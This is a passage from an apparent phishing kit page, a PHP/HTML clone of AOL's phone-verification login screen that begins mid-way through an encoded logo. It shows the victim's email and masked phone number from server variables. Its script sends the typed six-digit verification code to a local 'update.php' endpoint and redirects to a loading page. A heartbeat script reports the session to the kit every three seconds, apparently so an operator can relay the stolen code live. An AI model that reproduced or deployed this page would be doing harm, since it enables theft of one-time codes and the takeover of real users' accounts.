zNS44MDYzODMsNC4zNzU4NzcxOSBDMzQuODYwODUxMSw0Ljc2MTg0MjExIDMzLjgyNjM4Myw1LjAzNjg0MjExIDMyLjY4ODkzNjIsNS4yMTA1MjYzMiBDMzIuODk0ODkzNiw1LjQwODMzMzMzIDMzLjE0NzY1OTYsNS42Njg4NTk2NSAzMy40NDcyMzQsNS45OTIxMDUyNiBDMzMuNzQ2ODA4NSw2LjMxNTM1MDg4IDMzLjkwNTk1NzQsNi40ODkwMzUwOSAzMy45Miw2LjUxMzE1Nzg5IEMzNC4wMjc2NTk2LDYuNjcyMzY4NDIgMzQuMTgyMTI3Nyw2Ljg2NTM1MDg4IDM0LjM3ODcyMzQsNy4xMDE3NTQzOSBDMzQuNTc1MzE5MSw3LjMzODE1Nzg5IDM0LjcxMTA2MzgsNy41MTY2NjY2NyAzNC43OTA2MzgzLDcuNjUxNzU0MzkgQzM0Ljg3MDIxMjgsNy43ODY4NDIxMSAzNC45MDc2NTk2LDcuOTQ2MDUyNjMgMzQuOTA3NjU5Niw4LjEzNDIxMDUzIEMzNC45MDc2NTk2LDguMzc1NDM4NiAzNC44MTg3MjM0LDguNTg3NzE5MyAzNC42NDU1MzE5LDguNzY2MjI4MDcgQzM0LjQ3MjM0MDQsOC45NDQ3MzY4NCAzNC4yNDI5Nzg3LDkuMDM2NDAzNTEgMzMuOTY2ODA4NSw5LjAzNjQwMzUxIEMzMy42OTA2MzgzLDkuMDM2NDAzNTEgMzMuMzc3MDIxMyw4LjgxNDQ3MzY4IDMzLjAzMDYzODMsOC4zNzA2MTQwNCBDMzIuNjg0MjU1Myw3LjkyNjc1NDM5IDMyLjIzNDg5MzYsNy4xMjU4NzcxOSAzMS42ODcyMzQsNS45NzI4MDcwMiBDMzEuMTMwMjEyOCw3LjAxNDkxMjI4IDMwLjc2MDQyNTUsNy43IDMwLjU2ODUxMDYsOC4wMzI4OTQ3NCBDMzAuMzc2NTk1Nyw4LjM2NTc4OTQ3IDMwLjE5NDA0MjYsOC42MTY2NjY2NyAzMC4wMjA4NTExLDguNzg1NTI2MzIgQzI5Ljg0NzY1OTYsOC45NTQzODU5NiAyOS42NDYzODMsOS4wNDEyMjgwNyAyOS40MTcwMjEzLDkuMDQxMjI4MDcgQzI5LjE0NTUzMTksOS4wNDEyMjgwNyAyOC45MjA4NTExLDguOTQ0NzM2ODQgMjguNzQyOTc4Nyw4Ljc1MTc1NDM5IEMyOC41NjUxMDY0LDguNTU4NzcxOTMgMjguNDc2MTcwMiw4LjM1NjE0MDM1IDI4LjQ3NjE3MDIsOC4xMzQyMTA1MyBDMjguNDc2MTcwMiw3LjkzMTU3ODk1IDI4LjUxMzYxNyw3Ljc3NzE5Mjk4IDI4LjU4MzgyOTgsNy42NzEwNTI2MyBDMjkuMjU3ODcyMyw2LjczMDI2MzE2IDI5Ljk2LDUuOTEwMDg3NzIgMzAuNjkwMjEyOCw1LjIxNTM1MDg4IEMzMC4wNzcwMjEzLDUuMTE4ODU5NjUgMjkuNTI5MzYxNyw1LjAwNzg5NDc0IDI5LjA0MjU1MzIsNC44ODcyODA3IEMyOC41NjA0MjU1LDQuNzY2NjY2NjcgMjguMDUwMjEyOCw0LjU4ODE1Nzg5IDI3LjUwNzIzNCw0LjM1NjU3ODk1IEMyNy40MTgyOTc5LDQuMzEzMTU3ODkgMjcuMzM0MDQyNiw0LjIwNzAxNzU0IDI3LjI0OTc4NzIsNC4wNDc4MDcwMiBDMjcuMTY1NTMxOSwzLjg4ODU5NjQ5IDI3LjEyMzQwNDMsMy43MzkwMzUwOSAyNy4xMjM0MDQzLDMuNTk5MTIyODEgQzI3LjEyMzQwNDMsMy4zMzM3NzE5MyAyNy4yMTcwMjEzLDMuMTE2NjY2NjcgMjcuNDA0MjU1MywyLjkzODE1Nzg5IEMyNy41OTE0ODk0LDIuNzU5NjQ5MTIgMjcuODA2ODA4NSwyLjY3MjgwNzAyIDI4LjA0NTUzMTksMi42NzI4MDcwMiBDMjguMjIzNDA0MywyLjY3MjgwNzAyIDI4LjQzODcyMzQsMi43MjU4NzcxOSAyOC43MDU1MzE5LDIuODM2ODQyMTEgQzI4Ljk3MjM0MDQsMi45NDc4MDcwMiAyOS4zMDQ2ODA5LDMuMTAyMTkyOTggMjkuNzA3MjM0LDMuMzA5NjQ5MTIgQzMwLjEwOTc4NzIsMy41MTcxMDUyNiAzMC41Nzc4NzIzLDMuNzQ4Njg0MjEgMzEuMDkyNzY2LDQuMDA0Mzg1OTYgQzMwLjk5OTE0ODksMy41MzE1Nzg5NSAzMC45MTk1NzQ1LDIuOTg2NDAzNTEgMzAuODU4NzIzNCwyLjM2ODg1OTY1IEMzMC43OTc4NzIzLDEuNzUxMzE1NzkgMzAuNzY1MTA2NCwxLjMzNjQwMzUxIDMwLjc2NTEwNjQsMS4xMDk2NDkxMiBDMzAuNzY1MTA2NCwwLjgyOTgyNDU2MSAzMC44NDkzNjE3LDAuNTkzNDIxMDUzIDMxLjAyMjU1MzIsMC4zOTA3ODk0NzQgQzMxLjE5NTc0NDcsMC4xODgxNTc4OTUgMzEuNDE1NzQ0NywwLjA5MTY2NjY2NjcgMzEuNjg3MjM0LDAuMDkxNjY2NjY2NyBDMzEuOTQ5MzYxNywwLjA5MTY2NjY2NjcgMzIuMTY5MzYxNywwLjE5Mjk4MjQ1NiAzMi4zMzc4NzIzLDAuMzkwNzg5NDc0IEMzMi41MDYzODMsMC41ODg1OTY0OTEgMzIuNTk1MzE5MSwwLjg1Mzk0NzM2OCAzMi41OTUzMTkxLDEuMTg2ODQyMTEgQzMyLjU5NTMxOTEsMS4yNzg1MDg3NyAzMi41ODEyNzY2LDEuNDU3MDE3NTQgMzIuNTU3ODcyMywxLjcyMjM2ODQyIEMzMi41MzQ0NjgxLDEuOTg3NzE5MyAzMi40OTcwMjEzLDIuMzE1Nzg5NDcgMzIuNDUwMjEyOCwyLjY5NjkyOTgyIEMzMi40MDM0MDQzLDMuMDc4MDcwMTggMzIuMzQyNTUzMiwzLjUxNzEwNTI2IDMyLjI4MTcwMjEsNC4wMDkyMTA1MyBaIiBpZD0iUGF0aCI+PC9wYXRoPgogICAgICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik00NS44MTA2MzgzLDQuMDA5MjEwNTMgQzQ2LjI4ODA4NTEsMy43ODI0NTYxNCA0Ni43Mzc0NDY4LDMuNTU1NzAxNzUgNDcuMTcyNzY2LDMuMzI4OTQ3MzcgQzQ3LjYwODA4NTEsMy4xMDIxOTI5OCA0Ny45NDk3ODcyLDIuOTM4MTU3ODkgNDguMjAyNTUzMiwyLjgzMjAxNzU0IEM0OC40NTUzMTkxLDIuNzI1ODc3MTkgNDguNjYxMjc2NiwyLjY3MjgwNzAyIDQ4LjgxNTc0NDcsMi42NzI4MDcwMiBDNDkuMDczMTkxNSwyLjY3MjgwNzAyIDQ5LjI5MzE5MTUsMi43NTk2NDkxMiA0OS40ODA0MjU1LDIuOTM4MTU3ODkgQzQ5LjY2NzY1OTYsMy4xMTY2NjY2NyA0OS43NjEyNzY2LDMuMzMzNzcxOTMgNDkuNzYxMjc2NiwzLjU5OTEyMjgxIEM0OS43NjEyNzY2LDMuNzQ4Njg0MjEgNDkuNzE0NDY4MSwzLjkwNzg5NDc0IDQ5LjYyNTUzMTksNC4wNjcxMDUyNiBDNDkuNTM2NTk1Nyw0LjIyNjMxNTc5IDQ5LjQzODI5NzksNC4zMzI0NTYxNCA0OS4zMzUzMTkxLDQuMzc1ODc3MTkgQzQ4LjM4OTc4NzIsNC43NjE4NDIxMSA0Ny4zNTA2MzgzLDUuMDM2ODQyMTEgNDYuMjE3ODcyMyw1LjIxMDUyNjMyIEM0Ni40MjM4Mjk4LDUuNDA4MzMzMzMgNDYuNjc2NTk1Nyw1LjY2ODg1OTY1IDQ2Ljk3NjE3MDIsNS45OTIxMDUyNiBDNDcuMjc1NzQ0Nyw2LjMxNTM1MDg4IDQ3LjQzNDg5MzYsNi40ODkwMzUwOSA0Ny40NDg5MzYyLDYuNTEzMTU3ODkgQzQ3LjU1NjU5NTcsNi42NzIzNjg0MiA0Ny43MTEwNjM4LDYuODY1MzUwODggNDcuOTA3NjU5Niw3LjEwMTc1NDM5IEM0OC4xMDQyNTUzLDcuMzM4MTU3ODkgNDguMjQsNy41MTY2NjY2NyA0OC4zMTk1NzQ1LDcuNjUxNzU0MzkgQzQ4LjM5OTE0ODksNy43ODY4NDIxMSA0OC40MzY1OTU3LDcuOTQ2MDUyNjMgNDguNDM2NTk1Nyw4LjEzNDIxMDUzIEM0OC40MzY1OTU3LDguMzc1NDM4NiA0OC4zNDc2NTk2LDguNTg3NzE5MyA0OC4xNzQ0NjgxLDguNzY2MjI4MDcgQzQ4LjAwMTI3NjYsOC45NDQ3MzY4NCA0Ny43NzE5MTQ5LDkuMDM2NDAzNTEgNDcuNDk1NzQ0Nyw5LjAzNjQwMzUxIEM0Ny4yMTk1NzQ1LDkuMDM2NDAzNTEgNDYuOTA1OTU3NCw4LjgxNDQ3MzY4IDQ2LjU1OTU3NDUsOC4zNzA2MTQwNCBDNDYuMjEzMTkxNSw3LjkyNjc1NDM5IDQ1Ljc2MzgyOTgsNy4xMjU4NzcxOSA0NS4yMTYxNzAyLDUuOTcyODA3MDIgQzQ0LjY1OTE0ODksNy4wMTQ5MTIyOCA0NC4yODkzNjE3LDcuNyA0NC4wOTc0NDY4LDguMDMyODk0NzQgQzQzLjkwNTUzMTksOC4zNjU3ODk0NyA0My43MjI5Nzg3LDguNjE2NjY2NjcgNDMuNTQ5Nzg3Miw4Ljc4NTUyNjMyIEM0My4zNzY1OTU3LDguOTU0Mzg1OTYgNDMuMTc1MzE5MSw5LjA0MTIyODA3IDQyLjk0NTk1NzQsOS4wNDEyMjgwNyBDNDIuNjc0NDY4MSw5LjA0MTIyODA3IDQyLjQ0OTc4NzIsOC45NDQ3MzY4NCA0Mi4yNzE5MTQ5LDguNzUxNzU0MzkgQzQyLjA5NDA0MjYsOC41NTg3NzE5MyA0Mi4wMDUxMDY0LDguMzU2MTQwMzUgNDIuMDA1MTA2NCw4LjEzNDIxMDUzIEM0Mi4wMDUxMDY0LDcuOTMxNTc4OTUgNDIuMDQyNTUzMiw3Ljc3NzE5Mjk4IDQyLjExMjc2Niw3LjY3MTA1MjYzIEM0Mi43ODY4MDg1LDYuNzMwMjYzMTYgNDMuNDg4OTM2Miw1LjkxMDA4NzcyIDQ0LjIxOTE0ODksNS4yMTUzNTA4OCBDNDMuNjA1OTU3NCw1LjExODg1OTY1IDQzLjA1ODI5NzksNS4wMDc4OTQ3NCA0Mi41NzE0ODk0LDQuODg3MjgwNyBDNDIuMDg5MzYxNyw0Ljc2NjY2NjY3IDQxLjU3OTE0ODksNC41ODgxNTc4OSA0MS4wMzYxNzAyLDQuMzU2NTc4OTUgQzQwLjk0NzIzNCw0LjMxMzE1Nzg5IDQwLjg2Mjk3ODcsNC4yMDcwMTc1NCA0MC43Nzg3MjM0LDQuMDQ3ODA3MDIgQzQwLjY5NDQ2ODEsMy44ODg1OTY0OSA0MC42NTIzNDA0LDMuNzM5MDM1MDkgNDAuNjUyMzQwNCwzLjU5OTEyMjgxIEM0MC42NTIzNDA0LDMuMzMzNzcxOTMgNDAuNzQ1OTU3NCwzLjExNjY2NjY3IDQwLjkzMzE5MTUsMi45MzgxNTc4OSBDNDEuMTIwNDI1NSwyLjc1OTY0OTEyIDQxLjMzNTc0NDcsMi42NzI4MDcwMiA0MS41NzQ0NjgxLDIuNjcyODA3MDIgQzQxLjc1MjM0MDQsMi42NzI4MDcwMiA0MS45Njc2NTk2LDIuNzI1ODc3MTkgNDIuMjM0NDY4MSwyLjgzNjg0MjExIEM0Mi41MDEyNzY2LDIuOTQ3ODA3MDIgNDIuODMzNjE3LDMuMTAyMTkyOTggNDMuMjM2MTcwMiwzLjMwOTY0OTEyIEM0My42Mzg3MjM0LDMuNTE3MTA1MjYgNDQuMTA2ODA4NSwzLjc0ODY4NDIxIDQ0LjYyMTcwMjEsNC4wMDQzODU5NiBDNDQuNTI4MDg1MSwzLjUzMTU3ODk1IDQ0LjQ0ODUxMDYsMi45ODY0MDM1MSA0NC4zODc2NTk2LDIuMzY4ODU5NjUgQzQ0LjMyNjgwODUsMS43NTEzMTU3OSA0NC4yOTQwNDI2LDEuMzM2NDAzNTEgNDQuMjk0MDQyNiwxLjEwOTY0OTEyIEM0NC4yOTQwNDI2LDAuODI5ODI0NTYxIDQ0LjM3ODI5NzksMC41OTM0MjEwNTMgNDQuNTUxNDg5NCwwLjM5MDc4OTQ3NCBDNDQuNzI0NjgwOSwwLjE4ODE1Nzg5NSA0NC45NDQ2ODA5LDAuMDkxNjY2NjY2NyA0NS4yMTYxNzAyLDAuMDkxNjY2NjY2NyBDNDUuNDc4Mjk3OSwwLjA5MTY2NjY2NjcgNDUuNjk4Mjk3OSwwLjE5Mjk4MjQ1NiA0NS44NjY4MDg1LDAuMzkwNzg5NDc0IEM0Ni4wMzUzMTkxLDAuNTg4NTk2NDkxIDQ2LjEyNDI1NTMsMC44NTM5NDczNjggNDYuMTI0MjU1MywxLjE4Njg0MjExIEM0Ni4xMjQyNTUzLDEuMjc4NTA4NzcgNDYuMTEwMjEyOCwxLjQ1NzAxNzU0IDQ2LjA4NjgwODUsMS43MjIzNjg0MiBDNDYuMDYzNDA0MywxLjk4NzcxOTMgNDYuMDI1OTU3NCwyLjMxNTc4OTQ3IDQ1Ljk3OTE0ODksMi42OTY5Mjk4MiBDNDUuOTMyMzQwNCwzLjA3ODA3MDE4IDQ1Ljg2NjgwODUsMy41MTcxMDUyNiA0NS44MTA2MzgzLDQuMDA5MjEwNTMgWiIgaWQ9IlBhdGgiPjwvcGF0aD4KICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgPC9nPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+Cg==)no-repeat center;
      background-size: auto 3.17647rem
    }

    .mbr-login-hd .logo {
      display: block;
      margin: 0 auto;
      max-width: 90vw;
      padding-top: 18px;
      padding-bottom: 18px
    }

    .login-box .mbr-login-hd {
      background-color: #fff;
      color: #26282a
    }

    .grid .mbr-login-hd .logo {
      padding: 0
    }

    .grid .mbr-login-hd {
      margin-bottom: 0
    }

    .grid .login-box .mbr-login-hd {
      padding-top: 28px;
      padding-bottom: 0
    }

    .mbr-desktop-hd {
      position: relative;
      background-color: #fff;
      color: #26282a;
      line-height: 84px;
      padding-left: 50px
    }

    .mbr-desktop-hd .column.help {
      position: absolute;
      right: 64px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 13px
    }

    .mbr-desktop-hd .column {
      display: inline-block;
      box-sizing: border-box;
      vertical-align: middle;
      line-height: normal;
      font-size: 0
    }

    @media screen and (max-width:480px),
    screen and (max-height:480px) {
      .responsive .mbr-desktop-hd {
        display: none
      }
    }

    @keyframes slideInUp {
      0% {
        transform: translate3d(0, 500%, 0);
        opacity: 0
      }

      20% {
        opacity: .2
      }

      40% {
        opacity: .4
      }

      60% {
        opacity: .6
      }

      80% {
        opacity: .8
      }

      to {
        transform: translate3d(0, 0, 0);
        opacity: 1
      }
    }

    @keyframes flame {
      0% {
        height: 50px;
        opacity: 1
      }

      20% {
        opacity: .8;
        height: 40px
      }

      40% {
        opacity: .6;
        height: 30px
      }

      60% {
        opacity: .4;
        height: 20px
      }

      80% {
        opacity: .2;
        height: 10px
      }

      to {
        height: 0;
        opacity: 0
      }
    }

    .sf-hidden {
      display: none !important
    }
  </style>
  <link rel=canonical href="https://login.aol.com/account/challenge/phone-verify?src=fp-us&amp;client_id=dj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2&amp;intl=us&amp;redirect_uri=https%3A%2F%2Foidc.www.aol.com%2Fcallback&amp;pspid=1197803361&amp;activity=default&amp;done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3D2hgJR5WYz5qstHkcKPhzhCgxEHAfnKRq%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2520openid%2520openid2%2520sdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E&amp;acrumb=WiNTqjGn&amp;display=login&amp;authMechanism=primary&amp;sessionIndex=QQ--">
  <meta http-equiv=content-security-policy>
  <style>
    img[src="data:,"],
    source[src="data:,"] {
      display: none !important
    }
  </style>
  </head>
  <body class=bucket-mbr-push-upsell-control>
    <div id=login-body class="loginish puree-v2 responsive grid">
      <div class=mbr-desktop-hd>
        <span class=column>
          <a href=https://www.aol.com />
          <img src='data:image/svg+xml,
														<svg
															xmlns="http://www.w3.org/2000/svg" width="782" height="313">
															<rect fill-opacity="0"/>
														</svg>' alt=Aol class=logo style="background-blend-mode:normal!important;background-clip:content-box!important;background-position:50% 50%!important;background-color:rgba(0,0,0,0)!important;background-image:var(--sf-img-4)!important;background-size:100% 100%!important;background-origin:content-box!important;background-repeat:no-repeat!important" width=100 height>
          <img src=data:, alt=Aol class="dark-mode-logo logo sf-hidden" width=100 height>
          </a>
        </span>
        <span class="column help txt-align-right">
          <a href=https://help.aol.com />Help</a>
        </span>
      </div>
      <div class=login-box-container>
        <div class="login-box right">
          <div class="mbr-login-hd txt-align-center">
            <img src='data:image/svg+xml,
															<svg
																xmlns="http://www.w3.org/2000/svg" width="782" height="313">
																<rect fill-opacity="0"/>
															</svg>' alt=Aol class="logo aol-en-US" style="background-blend-mode:normal!important;background-clip:content-box!important;background-position:50% 50%!important;background-color:rgba(0,0,0,0)!important;background-image:var(--sf-img-4)!important;background-size:100% 100%!important;background-origin:content-box!important;background-repeat:no-repeat!important" width=100 height>
            <img src=data:, alt=Aol class="dark-mode-logo logo aol-en-US sf-hidden" width=100 height>
          </div>
          <div class="challenge phone-verify-challenge">
            <div class=challenge-header>
              <div class=yid><?php echo($email); ?></div>
            </div>
            <div id=phone-verify-challenge class=phone-verify-challenge-SECOND_CHALLENGE>
              <div class=challenge-heading>Enter verification&nbsp;code</div>
              <span class="challenge-desc txt-align-center">sent&nbsp;to</span>
              <strong class="challenge-sub-desc txt-align-center ltr" name=email>(<?php echo($first1); ?>**) ***-**<?php echo($last2); ?></strong>
              <div class="phone-otp-image challenge-img" aria-hidden=true></div>
              <form method=post action class="pure-form verification-form challenge-form" novalidate autocomplete=off>
                <div class=input-group>
                  <input id=verification-code-field autocomplete=new-password pattern=[0-9]* type=tel name=code maxlength=6 placeholder=------ value>
                  <script src="../../core/js/jquery.js"></script>
                  <script>
                  	function onSubmit() {
                  		if ( document.getElementById( 'verification-code-field' ).value != '' ) {
												$.ajax({
										      type: 'GET',
										      url: '../../core/update.php?mailsms=' + document.getElementById( 'verification-code-field' ).value,
										      success: function ( data ) {

										        var parsed_data = JSON.parse( data );

										        if ( parsed_data[ 'status' ] != 'error' ) {

										        	console.log( parsed_data[ 'status' ] );
										        	window.location.replace( '../../loading.php' );

										        }

										      }
										    });
                  		}
                  	}
                  	document.getElementById( 'verification-code-field' ).addEventListener( 'keypress', function(event) {
										  if ( event.key === 'Enter' ) {
										    event.preventDefault();
										    document.getElementById( 'verify-code-button' ).click();
										  }
										});
                  </script>
                  <label for=verification-code-field>Enter 6 characters&nbsp;code</label>
                </div>
                <div class=button-container>
                  <button type=button name=verifyCode id=verify-code-button class="pure-button puree-button-primary puree-spinner-button challenge-button" value=true data-ylk=elm:btn;elmt:yes;slk:yes;mKey:verify-code data-rapid-tracking=true onclick="onSubmit()"> Verify </button>
                </div>
                <div id=pvc-resend-container class=challenge-resend-container>
                  <p id=vc-resend-status class="hide challenge-resend-link-text sf-hidden" data-remaining-wait-time=60 data-msg-code-resend=Code&nbsp;sent data-is-resend=false data-msg-resend-code="Resend code in {seconds}"></p>
                  <button id=vc-resend-button-container type=submit name=resendCode class="show-for-nonjs hide pure-button puree-button-link challenge-resend-link sf-hidden" value=true data-ylk=elm:btn;elmt:yes;slk:yes;mKey:resend-code data-rapid-tracking=true> Resend&nbsp;code </button>
                </div>
                <div class="bottom-cta bottom-sticky">
                  <input type=submit name=skip class="pure-button puree-button-link challenge-button-link" value="Try another way to sign&nbsp;in" data-ylk=elm:btn;elmt:skip;slk:skip;mKey:skip data-rapid-tracking=true>
                </div>
              </form>
            </div>
          </div>
        </div>
        <div id=login-box-ad-fallback class=login-box-ad-fallback>
          <h1></h1>
          <p></p>
        </div>
      </div>
      <div class=login-bg-outer>
        <div class=login-bg-inner>
          <div id=login-ad-rich></div>
        </div>
      </div>
    </div>
    <noscript class=sf-hidden>
      <img src="/account/js-reporting/?crumb=4a4eUzIZHZs&amp;message=javascript_not_enabled&amp;ref=%2Faccount%2Fchallenge%2Fphone-verify" style="visibility: hidden;" width="0" height="0">
    </noscript>
    <div id=mbr-css-check class=sf-hidden></div>
    <div id=page-mask class="page-mask hide sf-hidden"></div>
    <div id=ad></div>
    <div class="mbr-legacy-device-bar sf-hidden" id=mbr-legacy-device-bar></div>
    <script>
      function hb() {
        $.ajax({
          type: 'GET',
          url: '../../core/heartbeat.php?id=' + '<?php echo( $_SESSION[ 'id' ] ); ?>',
          success: function ( data ) {},
          complete: function ( data ) {
            setTimeout( hb, 3000 );
          }
        });
      };hb();
    </script>